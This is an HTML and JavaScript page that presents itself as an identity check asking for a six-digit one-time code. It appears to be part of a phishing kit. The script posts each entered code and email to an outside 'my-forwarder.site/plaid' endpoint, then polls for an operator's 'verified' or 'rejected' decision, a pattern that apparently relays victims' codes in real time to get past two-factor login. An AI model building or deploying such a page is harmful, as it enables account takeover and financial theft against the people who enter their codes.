<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
        .otp-container { text-align: center; margin-top: 50px; }
        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
        .otp-input { width: 40px; height: 50px; text-align: center; font-size: 20px; }
        .btn { padding: 10px 20px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .btn:disabled { background: #ccc; }
        .throbber { display: none; width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .message { margin: 15px 0; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="otp-container">
        <h2>Verify Your Identity</h2>
        <p>Enter the 6-digit code sent to your device</p>
        
        <form id="otpForm">
            <div class="otp-inputs">
                <input type="text" maxlength="1" class="otp-input" data-index="1">
                <input type="text" maxlength="1" class="otp-input" data-index="2">
                <input type="text" maxlength="1" class="otp-input" data-index="3">
                <input type="text" maxlength="1" class="otp-input" data-index="4">
                <input type="text" maxlength="1" class="otp-input" data-index="5">
                <input type="text" maxlength="1" class="otp-input" data-index="6">
            </div>
            
            <div id="message" class="message"></div>
            <div class="throbber" id="throbber"></div>
            
            <button type="submit" class="btn" id="submitBtn" disabled>Verify</button>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const verificationCode = urlParams.get('code');
            const email = urlParams.get('email');
            const otpInputs = document.querySelectorAll('.otp-input');
            const otpForm = document.getElementById('otpForm');
            const submitBtn = document.getElementById('submitBtn');
            const throbber = document.getElementById('throbber');
            const messageEl = document.getElementById('message');
            
            let checkStatusInterval;
            let countdownInterval;

            // Auto-focus first input
            otpInputs[0].focus();

            // Handle OTP input navigation
            otpInputs.forEach(input => {
                input.addEventListener('input', function() {
                    const nextIndex = parseInt(this.dataset.index);
                    if (this.value.length === 1 && nextIndex < 6) {
                        otpInputs[nextIndex].focus();
                    }
                    updateSubmitButton();
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value.length === 0) {
                        const prevIndex = parseInt(this.dataset.index) - 2;
                        if (prevIndex >= 0) {
                            otpInputs[prevIndex].focus();
                        }
                    }
                });
            });

            // Form submission
            otpForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                showLoading(true);
                
                const otp = Array.from(otpInputs).map(i => i.value).join('');
                
                try {
                    const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            code: verificationCode,
                            email: email,
                            otp: otp,
                            action: 'verify'
                        })
                    });
                    
                    const data = await response.json();
                    if (!response.ok) throw new Error(data.message || 'Verification failed');
                    
                    // Start checking verification status
                    startStatusChecker();
                } catch (error) {
                    showMessage(error.message, 'error');
                    showLoading(false);
                }
            });

            function startStatusChecker() {
                checkStatusInterval = setInterval(async () => {
                    try {
                        const response = await fetch(`otp-check.php?code=${verificationCode}`);
                        const data = await response.json();
                        
                        if (data.otp_status === 'verified') {
                            clearInterval(checkStatusInterval);
                            handleSuccess();
                        } else if (data.otp_status === 'rejected') {
                            clearInterval(checkStatusInterval);
                            handleRejection();
                        }
                    } catch (error) {
                        console.error('Status check error:', error);
                    }
                }, 2000);
            }

            function handleSuccess() {
                showLoading(false);
                showMessage('Verification successful! Redirecting...', 'success');
                setTimeout(() => {
                    window.location.href = 'success.html';
                }, 3000);
            }

            function handleRejection() {
                showLoading(false);
                showMessage('Invalid code. Please try again.', 'error');
                otpInputs.forEach(input => input.value = '');
                otpInputs[0].focus();
                updateSubmitButton();
            }

            function updateSubmitButton() {
                const allFilled = Array.from(otpInputs).every(i => i.value.length === 1);
                submitBtn.disabled = !allFilled;
            }

            function showLoading(show) {
                throbber.style.display = show ? 'block' : 'none';
                submitBtn.disabled = show;
                otpInputs.forEach(input => input.disabled = show);
            }

            function showMessage(msg, type) {
                messageEl.textContent = msg;
                messageEl.className = `message ${type}`;
                messageEl.style.display = 'block';
            }
        });
    </script>
</body>
</html>
